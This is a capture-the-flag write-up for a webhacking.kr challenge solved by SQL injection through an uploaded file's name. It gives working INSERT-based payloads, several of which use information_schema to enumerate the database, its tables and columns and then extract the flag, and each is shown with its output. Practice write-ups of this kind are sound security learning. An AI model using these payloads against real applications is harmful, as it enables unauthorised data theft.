# Old 29    SQLi (Via Filename)

URL: [https://webhacking.kr/challenge/web-14/index.php](https://webhacking.kr/challenge/web-14/index.php)

![old-29.png](/assets/ctf/webhacking.kr/old-29.png)

Looks like another SQLi. We are able to upload file and it seems to get recorded in database. I tried uploading `t.js'` for SQLi test and server didn't like that!

The usual payloads didn't work, so let's try to analyze what we have. Also odd trait during fuzzing was that `/` denotes start of the input...(?)

The application takes our file and inserts it into database, we control `file` column, but not others. 

Queries should be roughly like so:
```sql
INSERT INTO files (time, ip, file) VALUES (NOW(), PUBLIC_IP, file_input);

SELECT time, ip, file FROM files;
```

```sql
filename'),(1337,'8.8.8.8','injected"
```

![old-29-1.png](/assets/ctf/webhacking.kr/old-29-1.png)

Shuffling the deck and trying payload worked, I first used arbitrary IP but it didn't like that. If we use our Public IP we can see the results.
```sql
test', 1337,'PUBLIC_IP'),('injected
```

![old-29-2.png](/assets/ctf/webhacking.kr/old-29-2.png)

Test injection:
```sql
x',1,'x'),(database(),1,'PUBLIC_IP')#
---
1970-01-01 09:00:01	|	PUBLIC_IP	|	chall29
```

Get tables:
```sql
x',1,'x'),((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),1,'PUBLIC_IP')#
---
1970-01-01 09:00:01	|	PUBLIC_IP	|	files,flag_congratz
```

Get columns:
```sql
x',1,'x'),((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag_congratz'),1,'PUBLIC_IP')#
---
1970-01-01 09:00:01	|	PUBLIC_IP	|	flag
```

Get flag:
```sql
x',1,'x'),((SELECT GROUP_CONCAT(flag) FROM flag_congratz),1,'PUBLIC_IP')#
---
1970-01-01 09:00:01	|	PUBLIC_IP	|	FLAG{didYouFeelConfused?_sorry:)}
```
